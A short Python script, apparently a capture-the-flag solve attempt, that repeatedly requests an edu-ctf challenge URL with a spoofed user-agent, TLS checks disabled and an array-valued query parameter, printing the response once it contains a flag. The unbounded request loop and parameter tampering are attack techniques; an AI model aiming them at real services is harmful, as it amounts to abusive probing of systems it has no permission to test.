import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

while True:
    import requests
    headers = {'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'}
    r = requests.get('https://edu-ctf.csie.org:10155/?i=meow&c[]=haha',verify=False,headers=headers)
    if "FLAG" in r.text:
        print(r.text)